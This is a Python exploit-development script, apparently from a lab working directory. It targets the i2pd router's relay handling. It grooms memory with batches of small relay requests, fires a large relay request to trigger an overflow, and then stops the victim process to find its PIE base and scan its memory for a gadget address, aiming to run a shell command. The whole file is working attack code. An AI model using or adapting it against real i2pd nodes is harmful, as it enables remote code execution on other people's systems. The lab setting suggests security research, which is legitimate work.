
import sys, struct, time, signal, os
sys.path.insert(0, "/home/agentuser/i2pd-lab/vuln01")
import atk_p6_terminal as A
from atk_p6_terminal import Chain
A.LIBC_EXIT = A.get_libc_exit()
ch = Chain("echo MARK > /tmp/m1", 97)
ch.setup()
tag = ch.sc.relay_tag
# groom 一批小 relay 再来一个大触发溢出（对齐 do_leak 行为）
ch.fire_batch(4, 0x9000, tag, ln=A.RELAY_SMALL)
ch.drain(ch.sc, want_nonces=list(range(0x9000,0x9004)), timeout=2.0)
# fire one big relay (RELAY_BIG) -> HandleRelayRequest active
import threading
ch.fire_batch(1, 0x9100, tag, ln=A.RELAY_BIG)
time.sleep(0.05)
os.kill(ch.bob_pid, signal.SIGSTOP); time.sleep(0.05)
maps = open("/proc/%d/maps" % ch.bob_pid).read()
pie = None
for line in maps.splitlines():
    if line.rstrip().endswith("/i2pd") and "r-xp" in line:
        parts = line.split(); pie = int(parts[0].split("-")[0],16) - int(parts[2],16); break
needle = struct.pack("<Q", pie + 0x42f4e7)
print("needle", hex(pie+0x42f4e7))
with open("/proc/%d/mem" % ch.bob_pid, "rb", 0) as mem:
    for line in maps.splitlines():
        parts = line.split(None, 5)
        a, b = parts[0].split("-"); a, b = int(a,16), int(b,16)
        nm = parts[5].strip() if len(parts)>5 else ""
        if "rw" not in parts[1] or "[vvar" in nm or "[vsys" in nm: continue
        try: mem.seek(a); data = mem.read(b-a)
        except Exception: continue
        st=0
        while True:
            i = data.find(needle, st)
            if i < 0: break
            print("HIT seg %#x-%#x name=%r at %#x" % (a,b,nm,a+i)); st=i+1
os.kill(ch.bob_pid, signal.SIGCONT)
